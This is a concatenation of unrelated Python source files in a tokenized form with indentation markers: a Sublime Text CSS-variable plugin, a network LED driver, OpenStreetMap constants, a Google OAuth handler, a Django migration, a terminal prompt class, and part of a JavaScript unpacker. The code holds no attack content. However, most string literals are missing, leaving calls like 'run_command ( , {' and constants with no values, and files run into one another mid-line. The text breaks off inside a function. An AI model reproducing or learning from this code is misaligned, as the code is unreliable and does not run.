# Add all setups to the setup tuple \n 
setups = ( less_setup , sass_setup , stylus_setup , sass_erb_setup ) \n 
\n 
chosen_setup = None \n 
\n 
self . edit = edit \n 
fn = self . view . file_name ( ) . encode ( "utf_8" ) \n 
\n 
for setup in setups : \n 
~~~ for ext in setup . extensions : \n 
~~~ if fn . endswith ( ext ) : \n 
~~~ chosen_setup = setup \n 
\n 
~~ ~~ ~~ if chosen_setup == None : \n 
~~~ return \n 
\n 
# Handle imports \n 
~~ imports = [ ] \n 
imported_vars = [ ] \n 
\n 
compiled_regex = re . compile ( chosen_setup . regex , re . MULTILINE ) \n 
\n 
if handle_imports : \n 
~~~ self . view . find_all ( "@import [\\"|\\\'](.*)[\\"|\\\']" , 0 , "$1" , imports ) \n 
\n 
file_dir = os . path . dirname ( fn ) . decode ( "utf-8" ) \n 
\n 
for i , filename in enumerate ( imports ) : \n 
~~~ has_extension = False \n 
for ext in chosen_setup . extensions : \n 
~~~ if filename . endswith ( ext . decode ( "utf-8" ) ) : \n 
~~~ has_extension = True \n 
\n 
~~ ~~ if has_extension == False : \n 
# We need to try and find the right extension \n 
~~~ for ext in chosen_setup . extensions : \n 
~~~ ext = ext . decode ( "utf-8" ) \n 
if os . path . isfile ( os . path . normpath ( file_dir + + filename + ext ) ) : \n 
~~~ filename += ext \n 
break \n 
~~ if chosen_setup . partials : \n 
~~~ fn_split = os . path . split ( filename ) \n 
partial_filename = fn_split [ 0 ] + "/_" + fn_split [ 1 ] \n 
if os . path . isfile ( os . path . normpath ( file_dir + partial_filename + ext ) ) : \n 
~~~ filename = "_" + filename + ext \n 
break \n 
~~ ~~ if chosen_setup . index and os . path . isfile ( os . path . normpath ( file_dir + "/" + filename ~~~ filename += "/index" + ext \n 
~~ ~~ ~~ try : \n 
~~~ f = open ( os . path . normpath ( file_dir + + filename ) , ) \n 
contents = f . read ( ) \n 
f . close ( ) \n 
\n 
m = re . findall ( compiled_regex , contents ) \n 
imported_vars = imported_vars + m \n 
~~ except : \n 
~~~ print ( + filename ) \n 
\n 
# Convert a list of tuples to a list of lists \n 
~~ ~~ imported_vars = [ list ( item ) for item in imported_vars ] \n 
\n 
~~ self . variables = [ ] \n 
\n 
vars_from_views = [ ] \n 
\n 
if read_all_views : \n 
~~~ for view in self . view . window ( ) . views ( ) : \n 
~~~ viewfn = self . view . file_name ( ) . encode ( "utf-8" ) \n 
compatible_view = False \n 
\n 
for ext in chosen_setup . extensions : \n 
~~~ if viewfn . endswith ( ext ) : \n 
~~~ viewvars = [ ] \n 
view . find_all ( chosen_setup . regex , 0 , "$1|$2" , viewvars ) \n 
vars_from_views += viewvars \n 
break ; \n 
~~ ~~ ~~ ~~ else : \n 
~~~ self . view . find_all ( chosen_setup . regex , 0 , "$1|$2" , self . variables ) \n 
\n 
\n 
\n 
~~ self . variables += vars_from_views \n 
self . variables = list ( set ( self . variables ) ) \n 
for i , val in enumerate ( self . variables ) : \n 
~~~ self . variables [ i ] = val . split ( "|" ) \n 
~~ self . variables = imported_vars + self . variables \n 
self . variables . sort ( ) \n 
self . view . window ( ) . show_quick_panel ( self . variables , self . insert_variable , sublime . MONOSPACE_FONT \n 
~~ def insert_variable ( self , choice ) : \n 
~~~ if choice == - 1 : \n 
~~~ return \n 
~~ self . view . run_command ( , { : self . variables [ choice ] [ 0 ] } ) \n 
\n 
~~ ~~ class InsertText ( sublime_plugin . TextCommand ) : \n 
~~~ def run ( self , edit , string = ) : \n 
~~~ for selection in self . view . sel ( ) : \n 
~~~ self . view . insert ( edit , selection . begin ( ) , string ) \n 
~~ ~~ ~~ from driver_base import DriverBase \n 
import socket \n 
import sys \n 
import time \n 
\n 
import os \n 
os . sys . path . insert ( 0 , os . path . dirname ( os . path . dirname ( os . path . abspath ( __file__ ) ) ) ) \n 
import log \n 
\n 
\n 
class CMDTYPE : \n 
~~~ SETUP_DATA = 1 # reserved for future use \n 
PIXEL_DATA = 2 \n 
BRIGHTNESS = 3 \n 
\n 
\n 
~~ class RETURN_CODES : \n 
~~~ SUCCESS = 255 # All is well \n 
ERROR = 0 # Generic error \n 
ERROR_SIZE = 1 # Data receieved does not match given command length \n 
ERROR_UNSUPPORTED = 2 # Unsupported command \n 
\n 
\n 
~~ class DriverNetwork ( DriverBase ) : \n 
~~~ """Driver for communicating with another device on the network.""" \n 
\n 
def __init__ ( self , num = 0 , width = 0 , height = 0 , host = "localhost" , port = 3142 ) : \n 
~~~ super ( DriverNetwork , self ) . __init__ ( num , width , height ) \n 
\n 
self . _host = host \n 
self . _port = port \n 
\n 
~~ def _generateHeader ( self , cmd , size ) : \n 
~~~ packet = bytearray ( ) \n 
packet . append ( cmd ) \n 
packet . append ( size & 0xFF ) \n 
packet . append ( size >> 8 ) \n 
return packet \n 
\n 
~~ def _connect ( self ) : \n 
~~~ try : \n 
~~~ s = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) \n 
s . connect ( ( self . _host , self . _port ) ) \n 
return s \n 
~~ except socket . gaierror : \n 
~~~ error = "Unable to connect to or resolve host: {}" . format ( \n 
self . _host ) \n 
log . error ( error ) \n 
raise IOError ( error ) \n 
\n 
# Push new data to strand \n 
~~ ~~ def update ( self , data ) : \n 
~~~ try : \n 
~~~ s = self . _connect ( ) \n 
\n 
count = self . bufByteCount \n 
packet = self . _generateHeader ( CMDTYPE . PIXEL_DATA , count ) \n 
\n 
packet . extend ( data ) \n 
\n 
s . sendall ( packet ) \n 
\n 
resp = ord ( s . recv ( 1 ) ) \n 
\n 
s . close ( ) \n 
\n 
if resp != RETURN_CODES . SUCCESS : \n 
~~~ log . warning ( "Bytecount mismatch! %s" , resp ) \n 
\n 
~~ ~~ except Exception as e : \n 
~~~ log . exception ( e ) \n 
error = "Problem communicating with network receiver!" \n 
log . error ( error ) \n 
raise IOError ( error ) \n 
\n 
~~ ~~ def setMasterBrightness ( self , brightness ) : \n 
~~~ packet = self . _generateHeader ( CMDTYPE . BRIGHTNESS , 1 ) \n 
packet . append ( brightness ) \n 
s = self . _connect ( ) \n 
s . sendall ( packet ) \n 
resp = ord ( s . recv ( 1 ) ) \n 
if resp != RETURN_CODES . SUCCESS : \n 
~~~ return False \n 
~~ else : \n 
~~~ return True \n 
\n 
~~ ~~ ~~ MANIFEST = [ \n 
{ \n 
"id" : "network" , \n 
"class" : DriverNetwork , \n 
"type" : "driver" , \n 
"display" : "Network" , \n 
"desc" : "Sends pixel data over the network to a reciever." , \n 
"params" : [ { \n 
"id" : "num" , \n 
"label" : "# Pixels" , \n 
"type" : "int" , \n 
"default" : 0 , \n 
"min" : 0 , \n 
"help" : "Total pixels in display. May use Width AND Height instead." \n 
} , { \n 
"id" : "width" , \n 
"label" : "Width" , \n 
"type" : "int" , \n 
"default" : 0 , \n 
"min" : 0 , \n 
"help" : "Width of display. Set if using a matrix." \n 
} , { \n 
"id" : "height" , \n 
"label" : "Height" , \n 
"type" : "int" , \n 
"default" : 0 , \n 
"min" : 0 , \n 
"help" : "Height of display. Set if using a matrix." \n 
} , { \n 
"id" : "host" , \n 
"label" : "Pixel Size" , \n 
"type" : "str" , \n 
"default" : "localhost" , \n 
"help" : "Receiver host to connect to." \n 
} , { \n 
"id" : "port" , \n 
"label" : "Port" , \n 
"type" : "int" , \n 
"default" : 3142 , \n 
"help" : "Port to connect to." \n 
} ] \n 
} \n 
] \n 
# Copyright (c) 2011 AOL Inc.  All Rights Reserved. \n 
# \n 
# Permission is hereby granted, free of charge, to any person \n 
# obtaining a copy of this software and associated documentation files \n 
# (the "Software"), to deal in the Software without restriction, \n 
# including without limitation the rights to use, copy, modify, merge, \n 
# publish, distribute, sublicense, and/or sell copies of the Software, \n 
# and to permit persons to whom the Software is furnished to do so, \n 
# subject to the following conditions: \n 
# \n 
# The above copyright notice and this permission notice shall be \n 
# included in all copies or substantial portions of the Software. \n 
# \n 
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, \n 
# EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF \n 
# MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND \n 
# NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS \n 
# BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN \n 
# ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN \n 
# CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE \n 
# SOFTWARE. \n 
\n 
## Define "constants", so that Python catches mis-spellings early. \n 
\n 
_ID = \n 
API = \n 
API_CALL_TIMEOUT = \n 
API_VERSION = \n 
API_VERSION_MAXIMUM = \n 
API_VERSION_MINIMUM = \n 
AREA = \n 
AREA_MAX = \n 
BBOX = \n 
BOUNDS = \n 
CFGSLAB = \n 
CFGVERSION = 1 \n 
CHANGESET = \n 
CHANGESETS = \n 
CHANGESETS_INLINE_SIZE = \n 
CHANGESETS_PER_SLAB = \n 
CHANGESETS_MAX = \n 
CONFIGURATION_SCHEMA_VERSION = \n 
CONTENT_TYPE = \n 
COUCHDB = \n 
DATASTORE = \n 
DATASTORE_BACKEND = \n 
DATASTORE_CONFIG = \n 
DATASTORE_ENCODING = \n 
DBHOST = \n 
DBJOB_ADDELEM = \n 
DBJOB_QUIT = \n 
DBNAME = \n 
DBNAME_SUFFIXES = # changesets, geodocs, nodes, relations, ways \n 
DBPORT = \n 
DBURL = \n 
DEFAULT = \n 
ELEMENT = \n 
FRONT_END = \n 
GENERATOR = \n 
GEODOC = \n 
GEODOC_LRU_SIZE = \n 
GEODOC_LRU_THREADS = \n 
GEOHASH_LENGTH = \n 
ID = \n 
JSON = \n 
K = \n 
LAT = \n 
LAT_MAX = + 90.0 \n 
LAT_MIN = - 90.0 \n 
LON = \n 
LON_MAX = + 180.0 \n 
LON_MIN = - 180.0 \n 
MAXIMUM = \n 
MAXIMUM_ELEMENTS = \n 
MAXGHLAT = 89.999999999999992 \n 
MAXLAT = \n 
MAXLON = \n 
MEMBASE = \n 
MEMBASE_MAX_VALUE_LENGTH = 20 * 1024 * 1024 \n 
MEMBER = \n 
MEMBERS = \n 
MINIMUM = \n 
MINLAT = \n 
MINLON = \n 
ND = \n 
NODE = \n 
NODES = \n 
NODES_INLINE_SIZE = \n 
NODES_PER_SLAB = \n 
OSM = \n 
PER_PAGE = \n 
PORT = \n 
PROJECT_DOC = \n 
PROTOBUF = \n 
REF = \n 
REFERENCES = \n 
RELATION = \n 
RELATIONS = \n 
RELATIONS_INLINE_SIZE = \n 
RELATIONS_PER_SLAB = \n 
ROLE = \n 
SCALE_FACTOR = \n 
SECONDS = \n 
SERVER_NAME = \n 
SERVER_VERSION = \n 
SLAB_INDIRECT = 1 # Element \n 
SLAB_INLINE = 0 # Element is present inline. \n 
SLAB_LRU_SIZE = \n 
SLAB_LRU_THREADS = \n 
SLAB_NOT_PRESENT = 2 # Element is not present in the slab. \n 
SOURCE_REPOSITORY = \n 
STATUS = \n 
TAG = \n 
TAGS = \n 
TEXT_XML = \n 
TIMEOUT = \n 
TRACEPOINTS = \n 
TRACEPOINTS_PER_PAGE = \n 
TYPE = \n 
UTF8 = \n 
V = \n 
VERSION = \n 
WAY = \n 
WAYS = \n 
WAYS_INLINE_SIZE = \n 
WAYS_PER_SLAB = \n 
WAYNODES = \n 
WAYNODES_MAX = \n 
import webapp2 \n 
from urllib import urlencode \n 
import json , urllib2 \n 
\n 
from secret import client_id , client_secret \n 
import config \n 
\n 
class AuthRedirector ( webapp2 . RequestHandler ) : \n 
~~~ def get ( self ) : \n 
~~~ args = self . request . GET \n 
args [ "client_id" ] = client_id \n 
args [ "redirect_uri" ] = config . auth_redir_uri \n 
url = "https://accounts.google.com/o/oauth2/auth?" + urlencode ( args ) \n 
self . response . location = url \n 
self . response . status_int = 302 \n 
\n 
~~ ~~ def query_json ( url , data ) : \n 
~~~ """\n    Query JSON data from Google server using POST request.\n    Returns only data and ignores result code.\n    """ \n 
if not ( data is str ) : \n 
~~~ data = urlencode ( data ) \n 
~~ try : \n 
~~~ return json . loads ( urllib2 . urlopen ( url , data ) . read ( ) ) \n 
~~ except urllib2 . HTTPError as e : # exception is a file-like object \n 
~~~ return json . loads ( e . read ( ) ) \n 
\n 
~~ ~~ def json_compactify ( data ) : \n 
~~~ return json . dumps ( data , separators = ( , ) ) # compact encoding \n 
\n 
~~ class AuthCallback ( webapp2 . RequestHandler ) : \n 
~~~ """\n    This page is called by Google when user finished auth process.\n    It receives state (currently unused), code (if success) or error (if failure).\n    Then it queries Google for access and refresh tokens and passes them in urlencode form\n    to intermediate static page, which will show status and pass data to js code.\n    """ \n 
def get ( self ) : \n 
~~~ state = self . request . get ( "state" ) \n 
code = self . request . get ( "code" ) \n 
error = self . request . get ( "error" ) \n 
q = { \n 
"code" : code , \n 
"client_id" : client_id , \n 
"client_secret" : client_secret , \n 
"redirect_uri" : config . auth_redir_uri , \n 
"grant_type" : "authorization_code" , \n 
} \n 
result = query_json ( "https://accounts.google.com/o/oauth2/token" , q ) \n 
url = ( config . auth_success_page if "access_token" in result \n 
else config . auth_failure_page ) + "#" + urlencode ( result ) \n 
self . response . location = url \n 
self . response . status_int = 302 \n 
# return result as redirect to static page \n 
\n 
~~ ~~ class AuthRefresh ( webapp2 . RequestHandler ) : \n 
~~~ """\n    This page is used by client to refresh their access tokens.\n    An access token has lifetime of 1 hour, after that it becomes invalid and\n    needs to be refreshed.\n    So we receive refresh_token as a parameter\n    and return a new access_token with its lifetime as a json result.\n    """ \n 
def get ( self ) : \n 
~~~ refresh_token = self . request . get ( "refresh_token" ) \n 
if not refresh_token : \n 
~~~ self . response . status_int = 400 \n 
return \n 
~~ q = { \n 
"refresh_token" : refresh_token , \n 
"client_id" : client_id , \n 
"client_secret" : client_secret , \n 
"grant_type" : "refresh_token" , \n 
} \n 
result = query_json ( "https://accounts.google.com/o/oauth2/token" , q ) \n 
self . response . headers [ ] = "application/json; charset=UTF-8" \n 
self . response . write ( json_compactify ( result ) ) \n 
# return result as JSON \n 
\n 
~~ ~~ application = webapp2 . WSGIApplication ( [ \n 
( , AuthRedirector ) , \n 
( , AuthCallback ) , \n 
( , AuthRefresh ) , \n 
] , debug = True ) \n 
# -*- coding: utf-8 -*- \n 
from __future__ import unicode_literals \n 
\n 
from django . db import migrations , models \n 
\n 
\n 
class Migration ( migrations . Migration ) : \n 
\n 
~~~ dependencies = [ \n 
( , ) , \n 
] \n 
\n 
operations = [ \n 
migrations . AddField ( \n 
model_name = , \n 
name = , \n 
field = models . EmailField ( help_text = , max_length = 75 , null preserve_default = True , \n 
) , \n 
] \n 
#!/usr/bin/env python \n 
~~ from __future__ import print_function \n 
__author__ = "Martin Paul Eve" \n 
__email__ = "martin@martineve.com" \n 
\n 
"""\nA class to handle an interactive prompt.\n\nPortions of this file are Copyright 2014, Adrian Sampson.\n#\n# Permission is hereby granted, free of charge, to any person obtaining\n# a copy of this software and associated documentation files (the\n# "Software"), to deal in the Software without restriction, including\n# without limitation the rights to use, copy, modify, merge, publish,\n# distribute, sublicense, and/or sell copies of the Software, and to\n# permit persons to whom the Software is furnished to do so, subject to\n# the following conditions:\n#\n# The above copyright notice and this permission notice shall be\n# included in all copies or substantial portions of the Software.\n\n""" \n 
from debug import Debuggable \n 
import sys \n 
from difflib import SequenceMatcher \n 
import locale \n 
\n 
\n 
class Interactive ( Debuggable ) : \n 
~~~ def __init__ ( self , debug ) : \n 
~~~ self . debug = debug \n 
Debuggable . __init__ ( self , ) \n 
\n 
# ANSI terminal colorization code heavily inspired by pygments: \n 
# http://dev.pocoo.org/hg/pygments-main/file/b2deea5b5030/pygments/console.py \n 
# (pygments is by Tim Hatch, Armin Ronacher, et al.) \n 
self . COLOR_ESCAPE = "\\x1b[" \n 
self . DARK_COLORS = [ "black" , "darkred" , "darkgreen" , "brown" , "darkblue" , \n 
"purple" , "teal" , "lightgray" ] \n 
self . LIGHT_COLORS = [ "darkgray" , "red" , "green" , "yellow" , "blue" , \n 
"fuchsia" , "turquoise" , "white" ] \n 
self . RESET_COLOR = self . COLOR_ESCAPE + "39;49;00m" \n 
\n 
~~ def input_options ( self , options , require = False , prompt = None , fallback_prompt = None , \n 
numrange = None , default = None , max_width = 72 ) : \n 
~~~ """Prompts a user for input. The sequence of `options` defines the\n        choices the user has. A single-letter shortcut is inferred for each\n        option; the user\'s choice is returned as that single, lower-case\n        letter. The options should be provided as lower-case strings unless\n        a particular shortcut is desired; in that case, only that letter\n        should be capitalized.\n\n        By default, the first option is the default. `default` can be provided to\n        override this. If `require` is provided, then there is no default. The\n        prompt and fallback prompt are also inferred but can be overridden.\n\n        If numrange is provided, it is a pair of `(high, low)` (both ints)\n        indicating that, in addition to `options`, the user may enter an\n        integer in that inclusive range.\n\n        `max_width` specifies the maximum number of columns in the\n        automatically generated prompt string.\n        """ \n 
# Assign single letters to each option. Also capitalize the options \n 
# to indicate the letter. \n 
letters = { } \n 
display_letters = [ ] \n 
capitalized = [ ] \n 
first = True \n 
for option in options : \n 
# Is a letter already capitalized? \n 
~~~ for letter in option : \n 
~~~ if letter . isalpha ( ) and letter . upper ( ) == letter : \n 
~~~ found_letter = letter \n 
break \n 
~~ ~~ else : \n 
# Infer a letter. \n 
~~~ for letter in option : \n 
~~~ if not letter . isalpha ( ) : \n 
~~~ continue \n 
~~ if letter not in letters : \n 
~~~ found_letter = letter \n 
break \n 
~~ ~~ else : \n 
~~~ raise ValueError ( ) \n 
\n 
~~ ~~ letters [ found_letter . lower ( ) ] = option \n 
index = option . index ( found_letter ) \n 
\n 
\n 
if not require and ( ( default is None and not numrange and first ) or \n 
( isinstance ( default , basestring ) and \n 
found_letter . lower ( ) == default . lower ( ) ) ) : \n 
# The first option is the default; mark it. \n 
~~~ show_letter = % found_letter . upper ( ) \n 
is_default = True \n 
~~ else : \n 
~~~ show_letter = found_letter . upper ( ) \n 
is_default = False \n 
\n 
# Colorize the letter shortcut. \n 
~~ show_letter = self . colorize ( if is_default else , \n 
show_letter ) \n 
\n 
# Insert the highlighted letter back into the word. \n 
capitalized . append ( \n 
option [ : index ] + show_letter + option [ index + 1 : ] \n 
) \n 
display_letters . append ( found_letter . upper ( ) ) \n 
\n 
first = False \n 
\n 
# The default is just the first option if unspecified. \n 
~~ if require : \n 
~~~ default = None \n 
~~ elif default is None : \n 
~~~ if numrange : \n 
~~~ default = numrange [ 0 ] \n 
~~ else : \n 
~~~ default = display_letters [ 0 ] . lower ( ) \n 
\n 
# Make a prompt if one is not provided. \n 
~~ ~~ if not prompt : \n 
~~~ prompt_parts = [ ] \n 
prompt_part_lengths = [ ] \n 
if numrange : \n 
~~~ if isinstance ( default , int ) : \n 
~~~ default_name = str ( default ) \n 
default_name = self . colorize ( , default_name ) \n 
tmpl = \n 
prompt_parts . append ( tmpl % default_name ) \n 
prompt_part_lengths . append ( len ( tmpl % str ( default ) ) ) \n 
~~ else : \n 
~~~ prompt_parts . append ( ) \n 
prompt_part_lengths . append ( len ( prompt_parts [ - 1 ] ) ) \n 
~~ ~~ prompt_parts += capitalized \n 
prompt_part_lengths += [ len ( s ) for s in options ] \n 
\n 
# Wrap the query text. \n 
prompt = \n 
line_length = 0 \n 
for i , ( part , length ) in enumerate ( zip ( prompt_parts , \n 
prompt_part_lengths ) ) : \n 
# Add punctuation. \n 
~~~ if i == len ( prompt_parts ) - 1 : \n 
~~~ part += \n 
~~ else : \n 
~~~ part += \n 
~~ length += 1 \n 
\n 
# Choose either the current line or the beginning of the next. \n 
if line_length + length + 1 > max_width : \n 
~~~ prompt += \n 
line_length = 0 \n 
\n 
~~ if line_length != 0 : \n 
# Not the beginning of the line; need a space. \n 
~~~ part = + part \n 
length += 1 \n 
\n 
~~ prompt += part \n 
line_length += length \n 
\n 
# Make a fallback prompt too. This is displayed if the user enters \n 
# something that is not recognized. \n 
~~ ~~ if not fallback_prompt : \n 
~~~ fallback_prompt = \n 
if numrange : \n 
~~~ fallback_prompt += % numrange \n 
~~ fallback_prompt += . join ( display_letters ) + \n 
\n 
~~ resp = self . input_ ( prompt ) \n 
while True : \n 
~~~ resp = resp . strip ( ) . lower ( ) \n 
\n 
# Try default option. \n 
if default is not None and not resp : \n 
~~~ resp = default \n 
\n 
# Try an integer input if available. \n 
~~ if numrange : \n 
~~~ try : \n 
~~~ resp = int ( resp ) \n 
~~ except ValueError : \n 
~~~ pass \n 
~~ else : \n 
~~~ low , high = numrange \n 
if low <= resp <= high : \n 
~~~ return resp \n 
~~ else : \n 
~~~ resp = None \n 
\n 
# Try a normal letter input. \n 
~~ ~~ ~~ if resp : \n 
~~~ resp = resp [ 0 ] \n 
if resp in letters : \n 
~~~ return resp \n 
\n 
# Prompt for new input. \n 
~~ ~~ resp = self . input_ ( fallback_prompt ) \n 
\n 
~~ ~~ def input_ ( self , prompt = None ) : \n 
~~~ """Like `raw_input`, but decodes the result to a Unicode string.\n        Raises a UserError if stdin is not available. The prompt is sent to\n        stdout rather than stderr. A printed between the prompt and the\n        input cursor.\n        """ \n 
# raw_input incorrectly sends prompts to stderr, not stdout, so we \n 
# use print() explicitly to display prompts. \n 
# http://bugs.python.org/issue1927 \n 
if prompt : \n 
~~~ if isinstance ( prompt , unicode ) : \n 
~~~ prompt = prompt . encode ( self . _encoding ( ) , ) \n 
~~ print ( prompt , end = ) \n 
\n 
~~ try : \n 
~~~ resp = raw_input ( ) \n 
~~ except EOFError : \n 
~~~ self . debug . print_debug ( ) \n 
\n 
~~ return resp . decode ( sys . stdin . encoding or , ) \n 
\n 
~~ def _encoding ( self ) : \n 
~~~ """Tries to guess the encoding used by the terminal.""" \n 
# Determine from locale settings. \n 
try : \n 
~~~ return locale . getdefaultlocale ( ) [ 1 ] or \n 
~~ except ValueError : \n 
# Invalid locale environment variable setting. To avoid \n 
# failing entirely for no good reason, assume UTF-8. \n 
~~~ return \n 
\n 
~~ ~~ def _colorize ( self , color , text ) : \n 
~~~ """Returns a string that prints the given text in the given color\n        in a terminal that is ANSI color-aware. The color must be something\n        in DARK_COLORS or LIGHT_COLORS.\n        """ \n 
if color in self . DARK_COLORS : \n 
~~~ escape = self . COLOR_ESCAPE + "%im" % ( self . DARK_COLORS . index ( color ) + 30 ) \n 
~~ elif color in self . LIGHT_COLORS : \n 
~~~ escape = self . COLOR_ESCAPE + "%i;01m" % ( self . LIGHT_COLORS . index ( color ) + 30 ) \n 
~~ else : \n 
~~~ raise ValueError ( , color ) \n 
~~ return escape + text + self . RESET_COLOR \n 
\n 
\n 
~~ def colorize ( self , color , text ) : \n 
~~~ """Colorize text if colored output is enabled. (Like _colorize but\n        conditional.)\n        """ \n 
return self . _colorize ( color , text ) \n 
\n 
~~ def _colordiff ( self , a , b , highlight = , minor_highlight = ) : \n 
~~~ """Given two values, return the same pair of strings except with\n        their differences highlighted in the specified color. Strings are\n        highlighted intelligently to show differences; other values are\n        stringified and highlighted in their entirety.\n        """ \n 
if not isinstance ( a , basestring ) or not isinstance ( b , basestring ) : \n 
# Non-strings: use ordinary equality. \n 
~~~ a = unicode ( a ) \n 
b = unicode ( b ) \n 
if a == b : \n 
~~~ return a , b \n 
~~ else : \n 
~~~ return self . colorize ( highlight , a ) , self . colorize ( highlight , b ) \n 
\n 
~~ ~~ if isinstance ( a , bytes ) or isinstance ( b , bytes ) : \n 
# A path field. \n 
~~~ a = self . displayable_path ( a ) \n 
b = self . displayable_path ( b ) \n 
\n 
~~ a_out = [ ] \n 
b_out = [ ] \n 
\n 
matcher = SequenceMatcher ( lambda x : False , a , b ) \n 
for op , a_start , a_end , b_start , b_end in matcher . get_opcodes ( ) : \n 
~~~ if op == : \n 
# In both strings. \n 
~~~ a_out . append ( a [ a_start : a_end ] ) \n 
b_out . append ( b [ b_start : b_end ] ) \n 
~~ elif op == : \n 
# Right only. \n 
~~~ b_out . append ( self . colorize ( highlight , b [ b_start : b_end ] ) ) \n 
~~ elif op == : \n 
# Left only. \n 
~~~ a_out . append ( self . colorize ( highlight , a [ a_start : a_end ] ) ) \n 
~~ elif op == : \n 
# Right and left differ. Colorise with second highlight if \n 
\n 
~~~ if a [ a_start : a_end ] . lower ( ) != b [ b_start : b_end ] . lower ( ) : \n 
~~~ color = highlight \n 
~~ else : \n 
~~~ color = minor_highlight \n 
~~ a_out . append ( self . colorize ( color , a [ a_start : a_end ] ) ) \n 
b_out . append ( self . colorize ( color , b [ b_start : b_end ] ) ) \n 
~~ else : \n 
~~~ assert ( False ) \n 
\n 
~~ ~~ return . join ( a_out ) , . join ( b_out ) \n 
\n 
~~ def displayable_path ( self , path , separator = ) : \n 
~~~ """Attempts to decode a bytestring path to a unicode object for the\n        purpose of displaying it to the user. If the `path` argument is a\n        list or a tuple, the elements are joined with `separator`.\n        """ \n 
if isinstance ( path , ( list , tuple ) ) : \n 
~~~ return separator . join ( self . displayable_path ( p ) for p in path ) \n 
~~ elif isinstance ( path , unicode ) : \n 
~~~ return path \n 
~~ elif not isinstance ( path , str ) : \n 
# A non-string object: just get its unicode representation. \n 
~~~ return unicode ( path ) \n 
\n 
~~ try : \n 
~~~ return path . decode ( self . _fsencoding ( ) , ) \n 
~~ except ( UnicodeError , LookupError ) : \n 
~~~ return path . decode ( , ) \n 
\n 
~~ ~~ def _fsencoding ( self ) : \n 
~~~ """Get the system\'s filesystem encoding. On Windows, this is always\n        UTF-8 (not MBCS).\n        """ \n 
encoding = sys . getfilesystemencoding ( ) or sys . getdefaultencoding ( ) \n 
if encoding == : \n 
# On Windows, a broken encoding known to Python as "MBCS" is \n 
# used for the filesystem. However, we only use the Unicode API \n 
# for Windows paths, so the encoding is actually immaterial so \n 
# we can avoid dealing with this nastiness. We arbitrarily \n 
# choose UTF-8. \n 
~~~ encoding = \n 
~~ return encoding \n 
\n 
\n 
~~ def colordiff ( self , a , b , highlight = ) : \n 
~~~ """Colorize differences between two values if color is enabled.\n    (Like _colordiff but conditional.)\n    """ \n 
if self . gv . settings . get_setting ( , self ) == : \n 
~~~ return self . _colordiff ( a , b , highlight ) \n 
~~ else : \n 
~~~ return unicode ( a ) , unicode ( b ) \n 
\n 
~~ ~~ def print_ ( self , * strings ) : \n 
~~~ """Like print, but rather than raising an error when a character\n        is not in the terminal\'s encoding\'s character set, just silently\n        replaces it.\n        """ \n 
if strings : \n 
~~~ if isinstance ( strings [ 0 ] , unicode ) : \n 
~~~ txt = . join ( strings ) \n 
~~ else : \n 
~~~ txt = . join ( strings ) \n 
~~ ~~ else : \n 
~~~ txt = \n 
~~ if isinstance ( txt , unicode ) : \n 
~~~ txt = txt . encode ( self . _encoding ( ) , ) \n 
~~ print ( txt ) \n 
\n 
~~ def color_diff_suffix ( self , a , b , highlight = ) : \n 
~~~ """Colorize the differing suffix between two strings.""" \n 
a , b = unicode ( a ) , unicode ( b ) \n 
if not self . gv . settings . get_setting ( , self ) == : \n 
~~~ return a , b \n 
\n 
# Fast path. \n 
~~ if a == b : \n 
~~~ return a , b \n 
\n 
# Find the longest common prefix. \n 
~~ first_diff = None \n 
for i in range ( min ( len ( a ) , len ( b ) ) ) : \n 
~~~ if a [ i ] != b [ i ] : \n 
~~~ first_diff = i \n 
break \n 
~~ ~~ else : \n 
~~~ first_diff = min ( len ( a ) , len ( b ) ) \n 
\n 
# Colorize from the first difference on. \n 
~~ return a [ : first_diff ] + self . colorize ( highlight , a [ first_diff : ] ) , b [ : first_diff ] + self . colorize ( highlight , b [ first_diff : ] ) \n 
\n 
~~ def choose_candidate ( self , candidates , manipulate , opts , item = None , itemcount = None ) : \n 
~~~ self . print_ ( ) \n 
\n 
for i , match in enumerate ( candidates ) : \n 
# Index, metadata, and distance. \n 
~~~ line = [ \n 
. format ( i + 1 ) , \n 
. format ( manipulate . get_stripped_text ( match . reference_to_link ) \n 
) \n 
] \n 
\n 
self . print_ ( . join ( line ) ) \n 
\n 
# Ask the user for a choice. \n 
~~ sel = self . input_options ( opts , numrange = ( 1 , len ( candidates ) ) ) \n 
\n 
return sel # \n 
\n 
# by Einar Lielmanis <einar@jsbeautifier.org> \n 
# \n 
#     written by Stefano Sanfilippo <a.little.coder@gmail.com> \n 
# \n 
# usage: \n 
# \n 
# if detect(some_string): \n 
#     unpacked = unpack(some_string) \n 
# \n 
\n 
~~ ~~ """Unpacker for Dean Edward\'s p.a.c.k.e.r""" \n 
\n 
import re \n 
import string \n 
from jsbeautifier . unpackers import UnpackingError \n 
\n 
PRIORITY = 1 \n 
\n 
def detect ( source ) : \n 
~~~ """Detects whether `source` is P.A.C.K.E.R. coded.""" \n 
return source . replace ( , ) . startswith ( ) \n 
\n 
~~ def unpack ( source ) : \n 
~~~ """Unpacks P.A.C.K.E.R. packed js code.""" \n 
payload , symtab , radix , count = _filterargs ( source ) \n 
\n 
if count != len ( symtab ) : \n 
~~~ raise UnpackingError ( ) \n 
\n 
~~ try : \n 
~~~ unbase = Unbaser ( radix ) \n 
~~ except TypeError : \n 
~~~ raise UnpackingError ( ) \n 
\n 
~~ def lookup ( match ) : \n 
~~~ """Look up symbols in the synthetic symtab.""" \n 
word = match . group ( 0 ) \n 
return symtab [ unbase ( word ) ] or word \n 
\n 
~~ source = re . sub ( , lookup , payload ) \n 
return _replacestrings ( source ) \n 
\n 
~~ def _filterargs ( source ) : \n 
~~~ """Juice from a source file the four args needed by decoder.""" \n 
argsregex = ( r"}\\(\'(.*)\', *(\\d+), *(\\d+), *\'(.*)\'\\." \n 
r"split\\(\'\\|\'\\), *(\\d+), *(.*)\\)\\)" ) \n 
args = re . search ( argsregex , source , re . DOTALL ) . groups ( ) \n 
\n 
try : \n 
